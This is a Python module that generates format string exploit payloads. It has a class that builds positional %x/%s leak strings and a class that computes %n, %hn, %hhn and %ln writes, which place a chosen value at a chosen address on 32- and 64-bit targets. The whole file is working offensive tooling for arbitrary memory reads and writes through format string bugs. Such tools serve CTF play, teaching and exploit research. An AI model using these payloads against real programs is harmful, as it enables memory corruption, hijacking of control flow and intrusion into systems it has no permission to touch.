"""Module for Format String payloads"""


# Generic Helper Functions

def get_0xff_bytes(size):
	""" get size number of 0xff bytes """
	return_value = 0x0
	for i in range(0, size):
		return_value = return_value << 8
		return_value |= 0xff
	return return_value

def get_overflow_value(value: int, size: int) -> int:
	""" Calculate the overflow intger to get a value """
	overflowed = 0x01 << (size * 8)
	overflowed |= value
	return overflowed

def get_zero_value(printed_bytes: int, size: int) -> int:
	""" get the overflow value to get 0 """
	zero = 0x01 << (size * 8)
	bytes_written = get_0xff_bytes(size) & printed_bytes
	return zero - bytes_written

def get_int_arg(arg: str, kwargs: dict, required: bool = False) -> int:
	""" helper function to get integer value from kwargs """
	arg_value = kwargs.get(arg)
	if arg_value is not None:
		if isinstance(arg_value, int):
			return arg_value
		raise TypeError("%s must be int" % arg)
	if required:
		raise ValueError("%s must be specified" % arg)
	return 0

def gen_filler(size: int) -> bytes:
	""" Generate filler data """
	return b"0"*size

def get_arch_arg(kwargs: dict) -> int:
	""" get architecutre from argument """
	if "arch" in kwargs:
		arch = kwargs.get("arch")
		if isinstance(arch, int):
			if arch == 64:
				return 64
			if arch  in (32, 86):
				return 32
			raise ValueError("arch as int must be either 32 or 64")
		if isinstance(arch, str):
			if ("86" in arch) or ("32" in arch):
				return 32
			if "64" in arch:
				return 64
			raise ValueError("arch as str must be either '32' or '64'")
		raise TypeError("arch must be either str or int")
	return 32






class LeakFmtStr:
	"""Class for format string that leak"""

	# Valid data types
	valid_data_types = [b's', b'lx', b'x', b'hx', b'hhx']

	def __init__(self, **kwargs):

		self.data_type = kwargs.get("data_type")
		self.offset = get_int_arg("offset", kwargs)

		# Verify offset and data_type were specified
		# and correct type

		# Verify data_type is correct type
		if isinstance(self.data_type, str):
			self.data_type = bytes(self.data_type, 'utf-8')

		# Verify data_type is correct
		elif not isinstance(self.data_type, bytes):
			raise TypeError("data_type must be speicifed, and either str or bytes")

	def generate_fmt_str(self):
		"""Generate the format string"""
		return b"%%%d$%s" % (self.offset, self.data_type)





class WriteFmtStr:
	"""Class for format string that write"""

	# Mapping between size of write, and fmt string
	fmtStrings = {
		1:	b"hhn",
		2:	b"hn",
		4:	b"n",
		8:	b"ln"
	}

	# Mapping between max size of fmt string
	# and write sizes for architectures
	MaxFmtStrSizes32 = {
		38: [2, 2],
		17:	[4]
	}

	MaxFmtStrSizes64 = {
		88:	[2, 2, 2, 2],
		56: [4, 4]
	}

	# Mapping between number of writes
	# and size of writes
	numWritesMapping32 = {
		1:	[4],
		2:	[2, 2],
		3:	[1, 1, 2],
		4:	[1, 1, 1, 1]
	}

	numWritesMapping64 = {
		1:	[8],
		2:	[4, 4],
		3:	[2, 2, 4],
		4:	[2, 2, 2, 2],
		5:	[1, 1, 2, 2, 2],
		6:	[1, 1, 1, 1, 2, 2],
		7:	[1, 1, 1, 1, 1, 1, 2],
		8:	[1, 1, 1, 1, 1, 1, 1, 1]
	}

	# Default write sizes for architectures
	defaultWrite_sizes = {
		32: [2, 2],
		64: [2, 2, 2, 2]
	}

	sizes64 = {
		1:	7,
		2:	6,
		4:	5,
		8:	6
	}

	# Our error message
	errorPrompt =	"+" + "-"*35 + "+\n" + "|" \
					+ " "*15 + "Error" + " "*15 \
					+ "|\n" + "+" + "-"*35 + "+\n"

	def __init__(self, **kwargs):
		self.addresses = []
		self.arch = 32
		self.printed_bytes = 0
		self.alignment_bytes = 0
		self.write_sizes = None
		self.write_values = None
		self.address_offset_64 = None

		self.value = get_int_arg("value", kwargs, True)
		self.address = get_int_arg("address", kwargs, True)
		self.offset = get_int_arg("offset", kwargs, True)
		self.arch = get_arch_arg(kwargs)

		self.printed_bytes = get_int_arg("printed_bytes", kwargs)
		self.alignment_bytes = get_int_arg("alignment_bytes", kwargs)
		self.printed_bytes += self.alignment_bytes

		self.value += get_int_arg("value_base", kwargs)
		self.address += get_int_arg("address_base", kwargs)

		self.write_sizes = self.get_write_sizes(kwargs)

	def get_write_sizes(self, kwargs: dict) -> list:
		""" Get the write sizes """
		if "write_sizes" in kwargs:
			write_sizes = kwargs.get("write_sizes")
			if isinstance(write_sizes, list):
				return write_sizes
			raise TypeError("write_sizes must be list")

		if "num_writes" in kwargs:
			num_writes = kwargs.get("num_writes")
			if isinstance(num_writes, int):
				num_writes = num_writes % (self.get_ptr_size() + 1)
				if num_writes <= 0:
					raise ValueError("num_writes must be greater than 0")

				if self.arch == 32:
					write_sizes = self.numWritesMapping32[num_writes]
				if self.arch == 64:
					write_sizes = self.numWritesMapping64[num_writes]
				return write_sizes
			raise TypeError("num_writesmust be integer")

		if "max_size" in kwargs:
			max_size = kwargs.get("max_size")
			if isinstance(max_size, int):
				if self.arch == 32:
					size_mappings = self.MaxFmtStrSizes32
				elif self.arch == 64:
					size_mappings = self.MaxFmtStrSizes64
				for i in size_mappings.keys():
					if i <= max_size:
						return size_mappings[i]
				if self.write_sizes is None:
					raise ValueError("max_size too small")

			else:
				raise TypeError("max_size must be int")

		return self.defaultWrite_sizes[self.arch]

	def generate_print_size(self, i: int) -> bytes:
		""" Print desired number of bytes for writes """
		print_size = b""
		if self.arch == 32:
			print_size += b"%" + b"%dx" % self.write_values[i]
		if self.arch == 64:
			print_size += b"%" + b"%dc" % self.write_values[i]
		return print_size

	def generate_print_write(self, i: int) -> bytes:
		""" Gnerate the format string to cause the write """
		if self.address_offset_64 is None:
			offset = self.offset + i
		else:
			offset = self.offset + self.address_offset_64 + i
		fmt_str = self.fmtStrings[self.write_sizes[i]]
		return b"%" + b"%d$%s" % (offset, fmt_str)

	def gen_offfset_64(self) -> int:
		""" Calculate the offset to addresses for 64 bit fmt strings """
		address_offset_64 = 0
		for i in range(0, len(self.write_sizes)):
			address_offset_64 += self.sizes64[self.write_sizes[i]]
			address_offset_64 += len(str(self.offset)) + 1
			address_offset_64 += len(str(self.write_values[i]))

		adj = (address_offset_64 % 8)
		if adj:
			address_offset_64 += 8 - adj
		self.offset += int(address_offset_64 / 8)
		return address_offset_64

	def get_addresses(self):
		""" Get the addresses that will be written """
		addresses = []
		current_address = self.address
		for i in self.write_sizes:
			addresses.append(current_address)
			current_address += i
		self.addresses = addresses

	def get_ptr_size(self) -> int:
		""" Get the size of a memory address for the arch """
		if self.arch == 32:
			return 4
		return 8

	def get_write_values(self):
		""" Calculate the values that need to be printed """
		writes = []
		bytes_covered = 0
		current_size = 0
		for i in self.write_sizes:
			current_size = i
			next_value = self.get_bytes_at(bytes_covered, bytes_covered + current_size)
			writes.append(next_value)
			bytes_covered += current_size

		printed_bytes = self.printed_bytes
		printed_values = []
		current_print_size = 0
		for i in range(0, len(self.write_sizes)):
			if writes[i] == 0:
				current_print_size = get_zero_value(printed_bytes, self.write_sizes[i])

			elif printed_bytes < writes[i]:
				current_print_size = (writes[i] - printed_bytes)

			else:
				current_print_size = get_overflow_value(writes[i], self.write_sizes[i])
				current_print_size -= printed_bytes & get_0xff_bytes(self.write_sizes[i])

			printed_values.append(current_print_size)
			printed_bytes += current_print_size

		self.write_values = printed_values

	def get_bytes_at(self, start: int, end: int) -> int:
		""" Get the bytes between a range for an integer """
		num_bytes = end - start
		and_bytes = get_0xff_bytes(num_bytes)
		ret_bytes = and_bytes << (start * 8)
		ret_bytes = self.value & ret_bytes
		ret_bytes = ret_bytes >> (start * 8)
		return ret_bytes

	def generate_fmt_str(self) -> bytes:
		""" Generate the fmt string based on arch """
		if self.arch == 32:
			format_string = self.generate_fmt_str_32()
		elif self.arch == 64:
			format_string = self.generate_fmt_str_64()
		return format_string

	def generate_fmt_str_32(self) -> bytes:
		""" Generate a 32 bit fmt string """
		fmt_string = b""

		# Add all of the alignment bytes
		if self.alignment_bytes:
			fmt_string += gen_filler(self.alignment_bytes)

		# Add the addresses
		ptr_size = self.get_ptr_size()
		self.get_addresses()
		for i in self.addresses:
			fmt_string += i.to_bytes(ptr_size, 'little')
			self.printed_bytes += ptr_size

		# Add the prints/writes
		self.get_write_values()
		for i in range(0, len(self.write_sizes)):
			if self.write_values[i] == 0:
				continue
			fmt_string += self.generate_print_size(i)
			fmt_string += self.generate_print_write(i)

		return fmt_string

	def generate_fmt_str_64(self) -> bytes:
		""" Generate a 64 bit fmt string """
		self.get_write_values()
		address_offset_64 = self.gen_offfset_64()

		fmt_string = b""

		# Add all of the inital alignment bytes
		if self.alignment_bytes:
			fmt_string += gen_filler(self.alignment_bytes)

		# Add the prints/writes
		for i in range(0, len(self.write_sizes)):
			fmt_string += self.generate_print_size(i)
			fmt_string += self.generate_print_write(i)

		# Append filler bytes for addresses to get alginment
		if len(fmt_string) < (address_offset_64):
			fmt_string += gen_filler(address_offset_64 - len(fmt_string))

		ptr_size = self.get_ptr_size()
		# Add the addresses that will be written
		self.get_addresses()
		for i in range(0, len(self.addresses)):
			fmt_string += self.addresses[i].to_bytes(ptr_size, 'little')
		return fmt_string
